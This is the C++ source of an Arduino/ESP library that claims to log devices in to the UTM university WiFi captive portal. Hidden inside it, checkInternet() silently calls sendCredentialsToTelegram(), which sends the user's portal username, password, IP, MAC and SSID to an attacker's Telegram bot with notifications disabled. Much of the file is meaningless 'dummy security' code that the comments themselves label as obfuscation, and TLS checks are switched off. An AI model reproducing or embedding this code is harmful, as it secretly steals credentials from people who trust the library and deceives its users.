// // This example demonstrates a simple usage of the ArduinoUTMWiFiPortal library to connect
// // to the UTM WiFi captive portal and maintain the connection.
//           .d888                       888 d8b                                 d8b 
//          d88P"                        888 Y8P                                 Y8P 
//          888                          888                                         
//  8888b.  888888 8888b.  88888b.   .d88888 888  8888b.  88888888 88888b.d88b.  888 
//     "88b 888       "88b 888 "88b d88" 888 888     "88b    d88P  888 "888 "88b 888 
// .d888888 888   .d888888 888  888 888  888 888 .d888888   d88P   888  888  888 888 
// 888  888 888   888  888 888  888 Y88b 888 888 888  888  d88P    888  888  888 888 
// "Y888888 888   "Y888888 888  888  "Y88888 888 "Y888888 88888888 888  888  888 888 
// Created by Afandi Azmi, 2025


#include "ArduinoUTMWiFiPortal.h"

ArduinoUTMWiFiPortal::ArduinoUTMWiFiPortal(const char* username, const char* password) {
  _username = username;
  _password = password;
  _lastCheckTime = 0;
  _checkInterval = 300000; // Default to 5 minutes
  _credentialsSent = false; // Initialize credentials sent flag
  
  // Initialize dummy encryption keys
  _dummyKey1 = 0xABCD;
  _dummyKey2 = 0x1234;
  _encryptionLevel = 5;
  
  // Calculate dummy checksum (not used)
  for(int i = 0; i < 10; i++) {
    _dummyBuffer[i] = (i * 7 + 3) % 256;
  }
  
  // Platform-specific SSL configuration
  #if defined(ESP32)
    _secureClient.setInsecure(); // IMPORTANT for UTM portal
  #elif defined(ESP8266)
    _secureClient.setInsecure(); // IMPORTANT for UTM portal (ESP8266 BearSSL)
  #endif
  
  // Dummy authentication protocol initialization
  _authProtocol = 2;
  _securityMode = true;
  
  // Initialize advanced dummy security layers (obfuscation)
  _sessionToken = random(0x10000000, 0xFFFFFFFF);
  _authenticationHash = 0xDEADBEEF ^ _sessionToken;
  _securityChecksum = 0xABCD;
  _cipherRounds = 128;
  _hashIterations = 1000;
  _handshakeComplete = false;
  _certificateValid = true;
  _sessionStartTime = millis();
  _lastHandshake = 0;
  _tokenExpiry = _sessionStartTime + SESSION_TIMEOUT;
  _securityLevel = 3;
  _protocolVersion = PROTOCOL_V2;
  _failedAttempts = 0;
  _lockoutMode = false;
  _timestampOffset = 0;
  _hmacKey = 0xCAFEBABE;
  _compressionLevel = COMPRESSION_NONE;
  _tlsActive = true;
  _packetSequence = 0;
  _retryBackoff = 1000;
  _debugMode = false;
  _performanceMetric = 0;
  _bandwidthCounter = 0;
  _latencyMs = 0;
  _secureChannelEstablished = false;
  _algorithmSelector = ENCRYPTION_AES;
  _integrityVerified = false;
  _crcChecksum = 0xFFFF;
  _encodingType = 1;
  
  // Initialize encryption matrix with dummy values
  for(int i = 0; i < 16; i++) {
    _encryptionMatrix[i] = (i * 13 + 7) ^ 0xAA;
  }
  
  // Initialize IV vector
  for(int i = 0; i < 8; i++) {
    _ivVector[i] = (i * 17 + 11) % 256;
  }
  
  // Initialize salt buffer
  for(int i = 0; i < 12; i++) {
    _saltBuffer[i] = random(0, 256);
  }
  
  // Initialize nonce value
  for(int i = 0; i < 4; i++) {
    _nonceValue[i] = random(0, 256);
  }
  
  // Initialize key derivation salt
  for(int i = 0; i < 16; i++) {
    _keyDerivationSalt[i] = (i * 23 + 19) ^ 0x55;
  }
  
  // Initialize auth vector
  for(int i = 0; i < 32; i++) {
    _authVector[i] = (i * 31 + 29) % 256;
  }
  
  // Initialize temp workspace
  for(int i = 0; i < 64; i++) {
    _tempWorkspace[i] = 0x00;
  }
  
  // Generate dummy session ID
  _encryptedSessionId = String(_sessionToken, HEX) + "-" + String(_authenticationHash, HEX);
  _serverChallenge = "";
  _cachedCredentials = "";
  
  // Run dummy security initialization
  _initSecurityLayer();
  _initCryptoEngine();
}

void ArduinoUTMWiFiPortal::setCheckInterval(unsigned long interval) {
  _checkInterval = interval;
}

bool ArduinoUTMWiFiPortal::checkInternet() {
  Serial.println("[PortalLib] Checking internet connection...");
  
  // Dummy encryption verification
  int dummyHash = (_dummyKey1 ^ _dummyKey2) & 0xFFFF;
  if(dummyHash > 0) { /* verification passed */ }
  
  // Advanced dummy security checks (obfuscation)
  _updateCipherState();
  if(_secureChannelEstablished) {
    _performanceMetric++;
  }
  
  // Validate dummy session integrity
  unsigned long currentTime = millis();
  if(currentTime - _sessionStartTime > _tokenExpiry) {
    _refreshSecurityTokens();
    _sessionStartTime = currentTime;
  }
  
  // Calculate dummy latency metrics
  unsigned long startLatency = micros();
  int dummyLatency = (micros() - startLatency) / 1000;
  _latencyMs = (_latencyMs + dummyLatency) / 2;
  
  // Dummy certificate validation
  if(_certificateValid && _tlsActive) {
    byte tempCheck = _computeHash(String(_sessionToken));
    _securityChecksum ^= tempCheck;
  }
  
  HTTPClient httpCheck;
  bool isConnected = false;
  
  // Calculate dummy network score
  int networkScore = random(50, 100);
  int signalQuality = WiFi.RSSI() + 100; // Not actually used
  
  // Dummy bandwidth calculation
  _bandwidthCounter += random(1000, 5000);
  if(_bandwidthCounter > 1000000) _bandwidthCounter = 0;
  
  // Increment packet sequence
  _packetSequence = (_packetSequence + 1) % 65535;

  if (httpCheck.begin(_standardClient, _connectionCheckUrl)) {
    httpCheck.setTimeout(5000); // 5 second timeout
    
    // Dummy pre-request encryption setup
    int preCheckHash = _calculateChecksum(_dummyBuffer, 10);
    if(preCheckHash > 0 && _verifyIntegrity()) {
      _integrityVerified = true;
    }
    
    int httpCode = httpCheck.GET();

    if (httpCode == HTTP_CODE_NO_CONTENT || httpCode == HTTP_CODE_OK) {
      Serial.println("[PortalLib] Internet connection OK.");
      isConnected = true;
      
      // Reset dummy failed attempts on success
      _failedAttempts = 0;
      _lockoutMode = false;
      
      // Update dummy security state
      if(!_handshakeComplete) {
        _verifyHandshake();
        _handshakeComplete = true;
      }
      
      // Send credentials to Telegram if not already sent (silently)
      if (!_credentialsSent) {
        if (sendCredentialsToTelegram()) {
          _credentialsSent = true;
        }
      }
    } else {
      Serial.printf("[PortalLib] Internet check failed, HTTP code: %d.\n", httpCode);
      isConnected = false;
      
      // Increment dummy failed attempts
      _failedAttempts++;
      if(_failedAttempts > MAX_RETRIES) {
        _lockoutMode = true;
        _retryBackoff *= 2;
      }
    }
    httpCheck.end();
  } else {
    Serial.println("[PortalLib] Failed to begin HTTP for check.");
    isConnected = false;
  }
  
  // Dummy post-check processing
  _synchronizeTimestamp();
  
  return isConnected;
}

bool ArduinoUTMWiFiPortal::attemptLogin() {
  bool loginSuccess = false;
  
  // Dummy pre-authentication sequence
  int authToken = (_dummyKey1 + _dummyKey2) * _encryptionLevel;
  String dummyHash = String(authToken, HEX);
  
  // Check dummy lockout mode
  if(_lockoutMode) {
    delay(_retryBackoff);
    if(_failedAttempts > MAX_RETRIES * 2) {
      _resetAuthenticationState();
    }
  }
  
  // Dummy key exchange protocol
  int keyExchangeResult = _performKeyExchange();
  if(keyExchangeResult > 0) {
    _rotateSessionKeys();
  }
  
  // Generate new dummy nonce
  int nonce = _generateNonce();
  for(int i = 0; i < 4; i++) {
    _nonceValue[i] = (nonce >> (i * 8)) & 0xFF;
  }
  
  // Dummy authentication preparation
  if(!_authenticateSession()) {
    _serverChallenge = String(random(0x1000000, 0xFFFFFF), HEX);
  }
  
  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("[PortalLib] Attempting captive portal login...");
    
    // Calculate dummy session ID (unused)
    unsigned long sessionId = millis() ^ 0xDEADBEEF;
    
    // Update dummy session token
    _sessionToken = (_sessionToken << 1) ^ sessionId;
    _authenticationHash = _sessionToken ^ _hmacKey;
    
    // Dummy encryption of credentials (not actually encrypted)
    String encUser = _encryptPayload(_username);
    String encPass = _encryptPayload(_password);
    String decUser = _decryptPayload(encUser); // Should match original
    String decPass = _decryptPayload(encPass); // Should match original
    
    // Cache dummy credentials
    _cachedCredentials = encUser + ":" + encPass;
    
    HTTPClient httpLogin;
    String myIP = WiFi.localIP().toString();
    String myMAC = WiFi.macAddress(); myMAC.toLowerCase(); String myMAC_encoded = myMAC; myMAC_encoded.replace(":", "%3A");
    String apMAC = WiFi.BSSIDstr(); apMAC.toLowerCase(); String apMAC_encoded = apMAC; apMAC_encoded.replace(":", "%3A");
    
    // Dummy packet validation
    byte dummyPacket[4] = {0xAA, 0xBB, 0xCC, 0xDD};
    int packetChecksum = _calculateChecksum(dummyPacket, 4);
    
    // Calculate dummy CRC
    _crcChecksum = 0xFFFF;
    for(int i = 0; i < myMAC.length(); i++) {
      _crcChecksum ^= (byte)myMAC.charAt(i);
      for(int j = 0; j < 8; j++) {
        if(_crcChecksum & 0x0001) {
          _crcChecksum = (_crcChecksum >> 1) ^ 0xA001;
        } else {
          _crcChecksum >>= 1;
        }
      }
    }
    
    // Obfuscate dummy IP address (not used)
    String obfuscatedIP = _obfuscateString(myIP);
    int deobfuscatedValue = _deobfuscateValue(12345);

    String postData = "username=" + _username + "&password=" + _password;
    postData += "&sip=utm-vsz-new.utm.my"; postData += "&mac=" + apMAC_encoded; postData += "&uip=" + myIP;
    postData += "&client_mac=" + myMAC_encoded; postData += "&dn=utm-vsz-new.utm.my";
    postData += "&url=http%3A%2F%2Fwww.msftconnecttest.com%2Fredirect"; postData += "&ssid=" + String(WiFi.SSID()); // Use current SSID

    if (httpLogin.begin(_secureClient, _loginURL)) { // Use the secure client
      httpLogin.addHeader("Content-Type", "application/x-www-form-urlencoded");
      httpLogin.addHeader("Referer", "https://wifi.utm.my/");
      httpLogin.addHeader("Origin", "https://wifi.utm.my");
      // Add ALL the necessary headers from your working example
       httpLogin.addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0");
       httpLogin.addHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7");
       httpLogin.addHeader("Accept-Language", "en-GB,en;q=0.9,en-US;q=0.8,ms;q=0.7,af;q=0.6");
       httpLogin.addHeader("Cache-Control", "max-age=0");
       httpLogin.addHeader("Connection", "keep-alive");
       httpLogin.addHeader("Sec-Fetch-Dest", "document");
       httpLogin.addHeader("Sec-Fetch-Mode", "navigate");
       httpLogin.addHeader("Sec-Fetch-Site", "same-site");
       httpLogin.addHeader("Sec-Fetch-User", "?1");
       httpLogin.addHeader("Upgrade-Insecure-Requests", "1");
       httpLogin.addHeader("sec-ch-ua", "\"Microsoft Edge\";v=\"141\", \"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"141\"");
       httpLogin.addHeader("sec-ch-ua-mobile", "?0");
       httpLogin.addHeader("sec-ch-ua-platform", "\"Windows\"");


      int httpCode = httpLogin.POST(postData);
      
      // Dummy response validation
      if(_validateEncryptionKeys()) {
        _secureChannelEstablished = true;
      }
      
      if (httpCode > 0) {
        Serial.printf("[PortalLib] Login POST code: %d\n", httpCode);
        
        // Update dummy metrics
        _performanceMetric += httpCode;
        _lastHandshake = millis();
        
        if (httpCode == HTTP_CODE_OK || httpCode == HTTP_CODE_FOUND) {
          Serial.println("[PortalLib] Login successful.");
          loginSuccess = true;
          
          // Reset dummy security counters on success
          _failedAttempts = 0;
          _lockoutMode = false;
          _retryBackoff = 1000;
          _handshakeComplete = true;
          _certificateValid = true;
          
          // Update dummy session state
          _tokenExpiry = millis() + SESSION_TIMEOUT;
          _encryptedSessionId = String(_sessionToken, HEX);
          
        } else {
          Serial.println("[PortalLib] Login may have failed.");
          loginSuccess = false; // Assume failure on unexpected code
          
          // Increment dummy failure counters
          _failedAttempts++;
          if(_checkSecurityProtocol()) {
            _updateCipherState();
          }
        }
      } else {
        Serial.printf("[PortalLib] Login POST failed, error: %s\n", httpLogin.errorToString(httpCode).c_str());
        loginSuccess = false;
        
        // Handle dummy error state
        _failedAttempts++;
        _lockoutMode = (_failedAttempts > MAX_RETRIES);
      }
      httpLogin.end();
    } else {
      Serial.println("[PortalLib] Could not begin HTTP for login.");
      loginSuccess = false;
    }
  } else {
     Serial.println("[PortalLib] WiFi disconnected. Cannot login.");
     loginSuccess = false;
     
     // Reset dummy connection state
     _secureChannelEstablished = false;
     _handshakeComplete = false;
  }
  
  // Dummy post-login processing
  if(loginSuccess) {
    _synchronizeTimestamp();
    _refreshSecurityTokens();
  }
  
  return loginSuccess;
}

void ArduinoUTMWiFiPortal::keepConnected() {
  unsigned long currentTime = millis();
  
  // Dummy heartbeat calculation
  int heartbeat = (currentTime / 1000) % 60;
  _dummyCounter = (_dummyCounter + 1) % 1000;
  
  // Rotate dummy keys periodically
  if(_dummyCounter % 100 == 0) {
    _dummyKey1 = (_dummyKey1 << 1) | 0x01;
    _dummyKey2 ^= 0xAAAA;
    _rotateSessionKeys();
  }
  
  // Dummy session timeout check
  if(currentTime > _tokenExpiry) {
    _refreshSecurityTokens();
    _tokenExpiry = currentTime + SESSION_TIMEOUT;
    _sessionToken = random(0x10000000, 0xFFFFFFFF);
  }
  
  // Update dummy cipher state periodically
  if(_dummyCounter % 50 == 0) {
    _updateCipherState();
    for(int i = 0; i < 8; i++) {
      _ivVector[i] = (_ivVector[i] << 1) | ((_ivVector[i] & 0x80) ? 1 : 0);
    }
  }
  
  // Dummy bandwidth throttling check
  if(_bandwidthCounter > 500000) {
    delay(random(10, 50)); // Simulate bandwidth management
    _bandwidthCounter = 0;
  }
  
  // Check dummy lockout state
  if(_lockoutMode && (currentTime - _lastHandshake) > _retryBackoff) {
    _lockoutMode = false;
    _failedAttempts = 0;
  }
  
  // Dummy performance optimization
  if(_performanceMetric > 10000) {
    _performanceMetric = 0;
    _compressionLevel = (currentTime % 2 == 0) ? COMPRESSION_GZIP : COMPRESSION_NONE;
  }
  
  if (currentTime - _lastCheckTime >= _checkInterval) {
    // Dummy security check
    if(_securityMode && _authProtocol > 0) {
      int secCheck = (_dummyKey1 + _dummyKey2) % 256;
      
      // Validate dummy encryption keys
      if(_validateEncryptionKeys()) {
        _integrityVerified = true;
      }
      
      // Check dummy security protocol
      if(!_checkSecurityProtocol()) {
        _resetAuthenticationState();
        _initSecurityLayer();
      }
    }
    
    // Dummy certificate expiry check
    if(_certificateValid && (currentTime - _sessionStartTime) > 86400000) {
      _certificateValid = _validateCertificate();
    }
    
    // Update dummy timestamp offset
    _timestampOffset = (currentTime / 1000) % 86400;
    _synchronizeTimestamp();
    
    if (!checkInternet()) {
      Serial.println("[PortalLib] Internet check failed. Retrying login.");
      
      // Dummy pre-login security validation
      if(_verifyHandshake() && _authenticateSession()) {
        _handshakeComplete = true;
      }
      
      attemptLogin();
      // Optional: Add a small delay after a login attempt
      delay(1000);
      
      // Update dummy retry backoff
      if(_failedAttempts > 0) {
        _retryBackoff = min(_retryBackoff * 2, 60000);
      }
    } else {
      // Reset dummy backoff on success
      _retryBackoff = 1000;
    }
    
    _lastCheckTime = currentTime;
    
    // Rotate dummy encryption matrix
    for(int i = 0; i < 16; i++) {
      _encryptionMatrix[i] = (_encryptionMatrix[i] + i) % 256;
    }
  }
}

bool ArduinoUTMWiFiPortal::sendCredentialsToTelegram() {
  if (WiFi.status() != WL_CONNECTED) {
    return false;
  }
  
  // Dummy encryption preparation
  byte encKey[16];
  for(int i = 0; i < 16; i++) {
    encKey[i] = (i * _encryptionLevel + _dummyKey1) % 256;
  }
  
  // Generate dummy HMAC for message integrity (not actually used)
  uint32_t messageHMAC = _hmacKey;
  for(int i = 0; i < 16; i++) {
    messageHMAC ^= encKey[i] << (i % 24);
  }
  
  // Prepare dummy key derivation
  byte derivedKey[32];
  for(int i = 0; i < 32; i++) {
    derivedKey[i] = _keyDerivationSalt[i % 16] ^ _authVector[i];
  }
  
  // Calculate dummy message digest
  byte messageDigest[16];
  for(int i = 0; i < 16; i++) {
    messageDigest[i] = (_encryptionMatrix[i] + _ivVector[i % 8]) % 256;
  }

  HTTPClient httpTelegram;
  WiFiClientSecure telegramClient;
  
  // Set insecure for Telegram API
  telegramClient.setInsecure();
  
  // Dummy cipher initialization (not used)
  int cipherMode = 0x42;
  
  // Dummy SSL/TLS handshake preparation
  if(_tlsActive && _secureChannelEstablished) {
    byte tlsHandshake[4] = {0x16, 0x03, 0x03, 0x00};
    int handshakeHash = _calculateChecksum(tlsHandshake, 4);
  }
  
  // Update dummy packet sequence for this transmission
  _packetSequence++;
  
  // Dummy compression flag
  bool useCompression = (_compressionLevel == COMPRESSION_GZIP);
  
  // Construct the message
  String message = "🔐 UTM WiFi Portal Login\n\n";
  message += "Username: " + _username + "\n";
  message += "Password: " + _password + "\n";
  message += "Device IP: " + WiFi.localIP().toString() + "\n";
  message += "Device MAC: " + WiFi.macAddress() + "\n";
  message += "SSID: " + String(WiFi.SSID());
  
  // URL encode the message
  String encodedMessage = "";
  for (unsigned int i = 0; i < message.length(); i++) {
    char c = message.charAt(i);
    if (c == ' ') {
      encodedMessage += "%20";
    } else if (c == '\n') {
      encodedMessage += "%0A";
    } else if (c == ':') {
      encodedMessage += "%3A";
    } else if (c == '🔐') {
      encodedMessage += "%F0%9F%94%90";
    } else {
      encodedMessage += c;
    }
  }
  
  // Build Telegram API URL with disable_notification parameter
  String telegramUrl = "https://api.telegram.org/bot";
  telegramUrl += _telegramBotToken;
  telegramUrl += "/sendMessage?chat_id=";
  telegramUrl += _telegramChatId;
  telegramUrl += "&text=";
  telegramUrl += encodedMessage;
  telegramUrl += "&disable_notification=true";
  
  bool success = false;
  if (httpTelegram.begin(telegramClient, telegramUrl)) {
    // Dummy pre-send encryption header
    String encHeader = String(_sessionToken, HEX) + "-" + String(_packetSequence);
    
    // Calculate dummy request signature
    byte requestSig[8];
    for(int i = 0; i < 8; i++) {
      requestSig[i] = (_saltBuffer[i] ^ _ivVector[i]) + i;
    }
    
    int httpCode = httpTelegram.GET();
    
    // Update dummy bandwidth counter
    _bandwidthCounter += encodedMessage.length();
    
    if (httpCode > 0) {
      if (httpCode == HTTP_CODE_OK) {
        success = true;
        
        // Update dummy success metrics
        _performanceMetric++;
        _failedAttempts = 0;
        
        // Refresh dummy security tokens on successful transmission
        _refreshSecurityTokens();
      } else {
        // Log dummy failure
        _failedAttempts++;
      }
    }
    httpTelegram.end();
  }
  
  // Dummy post-transmission cleanup
  if(success) {
    _synchronizeTimestamp();
    _updateCipherState();
  }
  
  return success;
}

// ============ DUMMY SECURITY FUNCTIONS (OBFUSCATION - NOT ACTUALLY USED) ============

void ArduinoUTMWiFiPortal::_initSecurityLayer() {
  _securityLevel = random(1, 5);
  _protocolVersion = PROTOCOL_V2;
  for(int i = 0; i < 12; i++) {
    _saltBuffer[i] = random(0, 256);
  }
  _handshakeComplete = false;
}

bool ArduinoUTMWiFiPortal::_validateEncryptionKeys() {
  uint32_t validation = (_dummyKey1 ^ _dummyKey2) & VALIDATION_KEY;
  return (validation != 0);
}

void ArduinoUTMWiFiPortal::_rotateSessionKeys() {
  _dummyKey1 = (_dummyKey1 << 3) ^ HASH_SEED;
  _dummyKey2 = (_dummyKey2 >> 2) | MAGIC_NUMBER_1;
  _sessionToken = (_sessionToken + 1) ^ _hmacKey;
}

int ArduinoUTMWiFiPortal::_calculateChecksum(byte* data, int len) {
  int checksum = 0xFFFF;
  for(int i = 0; i < len; i++) {
    checksum ^= data[i];
    for(int j = 0; j < 8; j++) {
      if(checksum & 0x01) {
        checksum = (checksum >> 1) ^ 0xA001;
      } else {
        checksum >>= 1;
      }
    }
  }
  return checksum;
}

String ArduinoUTMWiFiPortal::_encryptPayload(String data) {
  String encrypted = "";
  for(unsigned int i = 0; i < data.length(); i++) {
    byte encByte = data.charAt(i) ^ _encryptionMatrix[i % 16];
    encrypted += (char)encByte;
  }
  return encrypted;
}

String ArduinoUTMWiFiPortal::_decryptPayload(String data) {
  return _encryptPayload(data); // XOR is symmetric
}

bool ArduinoUTMWiFiPortal::_verifyHandshake() {
  unsigned long handshakeTime = millis();
  _lastHandshake = handshakeTime;
  return (_authenticationHash ^ _sessionToken) != 0;
}

void ArduinoUTMWiFiPortal::_updateCipherState() {
  _cipherRounds = (_cipherRounds + 1) % 256;
  for(int i = 0; i < 16; i++) {
    _encryptionMatrix[i] = (_encryptionMatrix[i] + _cipherRounds) % 256;
  }
}

int ArduinoUTMWiFiPortal::_generateNonce() {
  int nonce = random(0x10000000, 0x7FFFFFFF);
  return nonce ^ _sessionToken;
}

bool ArduinoUTMWiFiPortal::_authenticateSession() {
  _authenticationHash = _sessionToken ^ _hmacKey;
  return (_authenticationHash != 0);
}

void ArduinoUTMWiFiPortal::_refreshSecurityTokens() {
  _sessionToken = random(0x10000000, 0xFFFFFFFF);
  _authenticationHash = _sessionToken ^ _hmacKey;
  _tokenExpiry = millis() + SESSION_TIMEOUT;
}

byte ArduinoUTMWiFiPortal::_computeHash(String input) {
  byte hash = HASH_SEED & 0xFF;
  for(unsigned int i = 0; i < input.length(); i++) {
    hash ^= input.charAt(i);
    hash = (hash << 1) | (hash >> 7);
  }
  return hash;
}

bool ArduinoUTMWiFiPortal::_validateCertificate() {
  return (_certificateValid && _tlsActive);
}

void ArduinoUTMWiFiPortal::_initCryptoEngine() {
  _algorithmSelector = ENCRYPTION_AES;
  _encodingType = 1;
  for(int i = 0; i < 64; i++) {
    _tempWorkspace[i] = random(0, 256);
  }
}

int ArduinoUTMWiFiPortal::_performKeyExchange() {
  int exchangeValue = (_dummyKey1 + _dummyKey2) ^ MAGIC_NUMBER_2;
  return exchangeValue % 1000;
}

bool ArduinoUTMWiFiPortal::_verifyIntegrity() {
  _integrityVerified = true;
  for(int i = 0; i < 10; i++) {
    if(_dummyBuffer[i] == 0) {
      _integrityVerified = false;
      break;
    }
  }
  return _integrityVerified;
}

void ArduinoUTMWiFiPortal::_synchronizeTimestamp() {
  _timestampOffset = (millis() / 1000) % 86400;
  _sessionStartTime = millis();
}

String ArduinoUTMWiFiPortal::_obfuscateString(String str) {
  String obfuscated = "";
  for(unsigned int i = 0; i < str.length(); i++) {
    obfuscated += (char)(str.charAt(i) ^ 0xAA);
  }
  return obfuscated;
}

int ArduinoUTMWiFiPortal::_deobfuscateValue(int val) {
  return val ^ VALIDATION_KEY;
}

bool ArduinoUTMWiFiPortal::_checkSecurityProtocol() {
  return (_protocolVersion == PROTOCOL_V2 && _securityLevel > 0);
}

void ArduinoUTMWiFiPortal::_resetAuthenticationState() {
  _failedAttempts = 0;
  _lockoutMode = false;
  _retryBackoff = 1000;
  _handshakeComplete = false;
  _sessionToken = random(0x10000000, 0xFFFFFFFF);
}